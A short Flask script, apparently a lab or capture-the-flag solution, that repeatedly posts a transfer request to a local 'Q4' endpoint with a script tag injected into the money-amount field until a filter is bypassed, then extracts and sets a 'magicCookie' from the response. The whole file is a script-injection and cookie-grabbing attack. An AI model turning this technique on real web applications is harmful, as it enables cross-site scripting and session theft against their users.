from flask import Flask, render_template, make_response
import requests

app = Flask(__name__)

@app.route("/")
def index():
    for i in range(0, 1001):
        script = str(i) + "<script>console.log('Here is the cookie:')<script>" 
        x = requests.post('http://localhost:2223/Q4', {"username":"AStaceyann16", "moneyAmount":script})
        print(i)
        if "Bad transfer occured" not in x.text:
            cookie = x.text[730:749]

            resp = make_response(f"{cookie}")
            resp.set_cookie('magicCookie', x.text[744:749])
            break


    
    return resp

